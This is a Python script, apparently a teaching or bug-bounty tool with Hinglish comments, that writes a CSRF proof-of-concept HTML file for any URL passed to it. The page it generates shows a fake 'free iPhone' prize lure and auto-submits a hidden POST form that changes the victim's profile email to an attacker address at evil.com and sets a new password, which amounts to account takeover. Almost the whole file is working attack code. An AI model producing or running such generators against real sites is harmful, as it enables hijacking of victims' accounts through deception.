import sys

def generate_csrf_poc(target_url):
    print(f"\n[*] Bhai, generating malicious CSRF PoC for: {target_url}")
    print("[*] Crafting the HTML payload... Please wait.\n")
    
    # The Malicious HTML Template
    # Isme victim ko ek fake page dikhega, par backend mein form submit ho jayega
    html_content = f"""
    <html>
      <title>Win a Free iPhone 15!</title>
      <body>
        <h1>🎉 Congratulations! You won a free iPhone! 🎉</h1>
        <p>Loading your prize... Please do not close this window.</p>

        <form action="{target_url}" method="POST" id="csrf_form" style="display: none;">
          <input type="hidden" name="email" value="hacker_sudosammi@evil.com" />
          <input type="hidden" name="password" value="Hacked123!" />
          <input type="hidden" name="action" value="update_profile" />
        </form>

        <script>
          document.getElementById('csrf_form').submit();
        </script>
      </body>
    </html>
    """
    
    file_name = "csrf_attack.html"
    
    try:
        with open(file_name, "w") as file:
            file.write(html_content)
        
        print(f"[+] BOOM! 🎯 CSRF PoC successfully generated and saved as: {file_name}")
        print("[*] Pro Tip: Real Bug Bounty report mein yahi HTML file company ko bheji jati hai.")
        print(f"[*] Fatafat terminal mein 'cat {file_name}' karke code dekho!")
        
    except Exception as e:
        print(f"[-] Arre yaar, error aa gaya: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 csrf_gen.py <target_vulnerable_url>")
        print("Example: python3 csrf_gen.py http://testphp.vulnweb.com/userinfo.php")
        sys.exit(1)
        
    target = sys.argv[1]
    generate_csrf_poc(target)
